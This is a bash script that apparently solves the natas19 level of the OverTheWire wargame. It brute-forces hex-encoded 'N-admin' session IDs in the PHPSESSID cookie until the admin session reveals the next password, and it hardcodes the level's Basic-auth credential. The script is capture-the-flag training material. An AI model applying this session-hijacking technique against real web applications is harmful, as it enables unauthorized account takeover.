#!/bin/bash

SECONDS=0

function perform_request(){
  curl -s 'http://natas19.natas.labs.overthewire.org/' \
    -H 'Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw' \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36' \
    -H "Cookie: PHPSESSID=$1" \
    --compressed \
    --insecure
}

function brute_force(){
  for sid in {1..640}; do
    echo "$sid-admin" 
    perform_request `echo -ne "$sid-admin" | xxd -p ` | grep "Password: " | cut -d"<" -f 1 | grep "Password: " && break
  done
}

function main(){
  brute_force
}

export -f {perform_request,brute_force}

main

echo -e "\n$SECONDS secs"
